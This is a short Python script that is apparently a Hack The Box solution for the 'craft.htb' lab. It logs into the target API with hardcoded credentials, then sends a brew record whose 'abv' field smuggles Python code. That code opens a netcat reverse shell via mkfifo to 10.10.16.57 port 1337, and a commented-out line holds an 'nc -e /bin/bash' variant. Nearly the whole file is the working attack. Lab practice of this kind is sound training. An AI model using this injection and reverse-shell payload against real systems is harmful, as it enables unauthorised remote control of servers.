#!/usr/bin/env python

import requests
import json

requests.packages.urllib3.disable_warnings()
response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']
print(response)

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)

print("Create real ABV brew")
brew_dict = {}
brew_dict['brewer'] = 'bullshit'
brew_dict['name'] = 'bullshit'
brew_dict['style'] = 'bullshit'
#brew_dict['abv'] = 'import os,os.system("nc -e /bin/bash 10.10.16.57 1337")'
brew_dict['abv'] = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.57 1337 >/tmp/f')"

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
